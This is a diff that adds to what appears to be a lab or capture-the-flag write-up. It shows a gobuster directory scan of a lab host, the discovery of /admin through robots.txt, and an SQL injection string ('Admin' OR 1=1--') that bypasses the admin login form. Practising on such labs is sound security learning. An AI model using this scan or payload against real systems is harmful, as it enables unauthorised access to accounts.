@@ -24,3 +24,26 @@ PORT    STATE SERVICE     VERSION
 139/tcp open  netbios-ssn Samba smbd 4.6.2
 445/tcp open  netbios-ssn Samba smbd 4.6.2
 
+gobuster dir -u http://10.129.147.83 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,zip.bak
+Results: 
+/.php                 (Status: 403) [Size: 278]
+/index.php            (Status: 200) [Size: 1620]
+/.html                (Status: 403) [Size: 278]
+/admin                (Status: 301) [Size: 314] [--> http://10.129.147.83/admin/]
+/config               (Status: 403) [Size: 278]
+/robots.txt           (Status: 200) [Size: 32]
+/server-status        (Status: 403) [Size: 278]
+
+Interesting results, first one I went to check out was robotx.txt the first result I got by looking at the page directly is 
+User-agent: *
+Disallow: /admin/
+Next page to look at is /admin
+On this page we have our basic login form asking for a username and password 
+With a sql injection I am able to bypass the login by using 
+Username = Admin' OR 1=1--
+Password = "Anything" 
+
+The Username field is weak to SQL injections. I am able to bypass the login form and I am now logged in as admin 
+
+
+
